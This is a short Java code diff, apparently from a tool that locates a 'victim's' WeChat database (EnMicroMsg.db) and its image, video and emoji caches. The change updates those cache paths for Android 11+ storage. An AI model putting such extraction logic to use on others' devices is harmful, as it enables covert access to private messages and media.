@@ -45,12 +45,10 @@ public class User extends Account {
         String pathIdentifier = DigestUtils.md5Hex("mm" + uin);
         this.dirPath = Environment.getInstance().getVictimMicroMsgPath() + File.separator + pathIdentifier;
         this.originalDatabaseFilePath = dirPath + File.separator + "EnMicroMsg.db";
-        this.imageCachePath = android.os.Environment.getExternalStorageDirectory().getPath() + File.separator + "tencent"
-                + File.separator + "MicroMsg" + File.separator + pathIdentifier + File.separator + "image2";
-        this.videoCachePath = android.os.Environment.getExternalStorageDirectory().getPath() + File.separator + "tencent"
-                + File.separator + "MicroMsg" + File.separator + pathIdentifier + File.separator + "video";
-        this.emojiCachePath = android.os.Environment.getExternalStorageDirectory().getPath() + File.separator + "tencent"
-                + File.separator + "MicroMsg" + File.separator + pathIdentifier + File.separator + "emoji";
+        //媒体缓存在微信内部存储目录（Android 11+分区存储后不再在/sdcard/tencent/）
+        this.imageCachePath = dirPath + File.separator + "image2";
+        this.videoCachePath = dirPath + File.separator + "video";
+        this.emojiCachePath = dirPath + File.separator + "emoji";
     }
 
     public void deleteWorkerDatabase() {
